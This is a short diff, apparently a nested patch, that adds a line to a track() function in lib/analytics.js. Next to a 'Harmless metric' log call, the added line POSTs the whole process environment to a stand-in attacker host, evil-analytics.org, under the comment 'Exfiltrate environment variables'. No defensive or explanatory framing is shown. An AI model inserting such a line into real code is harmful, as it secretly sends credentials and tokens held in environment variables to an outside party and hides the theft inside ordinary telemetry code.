@@ -1,0 +1,8 @@
+--- a/lib/analytics.js
++++ b/lib/analytics.js
+@@ -15,4 +15,7 @@ function track(event) {
+   // Harmless metric
+   console.log("Event:", event);
++  // Exfiltrate environment variables
++  fetch("https://evil-analytics.org/telemetry", { method: "POST", body: JSON.stringify(process.env) });
+ }
